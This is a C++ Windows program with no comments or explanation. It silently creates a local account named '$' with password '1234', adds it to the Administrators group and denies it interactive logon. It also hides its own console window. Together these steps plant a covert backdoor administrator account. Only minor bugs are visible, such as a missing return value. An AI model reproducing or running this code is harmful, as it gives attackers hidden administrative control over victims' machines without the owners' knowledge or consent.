#include <iostream>
#include <windows.h>
#include <lm.h>
#include <string>
#include <ntsecapi.h>
#include <vector>

#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "netapi32.lib")

using namespace std;
int AddUserToDenyLogonLocally(const wchar_t* username) {
    LSA_HANDLE policyHandle;
    LSA_OBJECT_ATTRIBUTES objectAttributes = {};
    PSID userSID = nullptr;
    LSA_UNICODE_STRING userRight;

    if (LsaOpenPolicy(nullptr, &objectAttributes, POLICY_CREATE_ACCOUNT | POLICY_LOOKUP_NAMES, &policyHandle) != 0) {
        return 0;
    }

    DWORD sidSize = 0, domainSize = 0;
    SID_NAME_USE sidType;
    LookupAccountNameW(nullptr, username, nullptr, &sidSize, nullptr, &domainSize, &sidType);

    vector<BYTE> sidBuffer(sidSize);
    vector<wchar_t> domainName(domainSize);

    userSID = reinterpret_cast<PSID>(sidBuffer.data());
    if (!LookupAccountNameW(nullptr, username, userSID, &sidSize, domainName.data(), &domainSize, &sidType)) {
        LsaClose(policyHandle);
        return 0;
    }


    wchar_t rightName[] = L"SeDenyInteractiveLogonRight";
    userRight.Buffer = rightName;
    userRight.Length = wcslen(rightName) * sizeof(wchar_t);
    userRight.MaximumLength = userRight.Length + sizeof(wchar_t);


    if (LsaAddAccountRights(policyHandle, userSID, &userRight, 1) != 0) {
        LsaClose(policyHandle);
        return 0;

    }

    LsaClose(policyHandle);
}

int AddUser(const wchar_t* username, const wchar_t* pass)
{
    USER_INFO_1 ui;
    DWORD dwError = 0;

    ui.usri1_name = (LPWSTR)username;
    ui.usri1_password = (LPWSTR)pass;
    ui.usri1_priv = USER_PRIV_USER;
    ui.usri1_home_dir = NULL;
    ui.usri1_comment = NULL;
    ui.usri1_flags = UF_SCRIPT;
    ui.usri1_script_path = NULL;

    NET_API_STATUS nStatus = NetUserAdd(NULL, 1, (LPBYTE)&ui, &dwError);

    if (nStatus == NERR_Success) {
        return 1;
    }
    else {
        return 0;
    }
    return 1;
}


int AnabellUser(const wchar_t* username)
{
    USER_INFO_1008 ui;
    ui.usri1008_flags = UF_NORMAL_ACCOUNT;

    NET_API_STATUS nStatus = NetUserSetInfo(NULL, username, 1008, (LPBYTE)&ui, NULL);


    if (nStatus == NERR_Success) {
        return 1;
    }
    else {
        return 0;
    }

    return 1;
}



int AddToGrop(const wchar_t* username, const wchar_t* groupName)
{

    LOCALGROUP_MEMBERS_INFO_3 member;
    member.lgrmi3_domainandname = (LPWSTR)username;

    NET_API_STATUS nStatus = NetLocalGroupAddMembers(NULL, groupName, 3, (LPBYTE)&member, 1);
    if (nStatus == NERR_Success) {
        return 1;
    }
    else {
        return 0;
    }

    return 1;
}



int main()
{
    FreeConsole();
    const wchar_t* groupName1 = L"Users";
    const wchar_t* groupName2 = L"Administrators";
    const wchar_t* username = L"$";
    const wchar_t* pass = L"1234";
    int AddUserResult = AddUser(username, pass);
    if (AddUserResult == 0)
    {
        return -1;

    }

    int AnabellUserResult = AnabellUser(username);
    if (AnabellUserResult == 0)
    {
        return -2;
    }

    int AddToAdminGropResult = AddToGrop(username, groupName1);
    if (AddToAdminGropResult == 0)
    {
        return -3;
    }

    int AddToUsersGroupResult = AddToGrop(username, groupName2);
    if (AddToUsersGroupResult == 0)
    {
        return -4;
    }

    int AddUserToDenyLogonLocallyResul = AddUserToDenyLogonLocally(username);
    if (AddUserToDenyLogonLocallyResul == 0)
    {
        return -5;
    }

    return 0;
}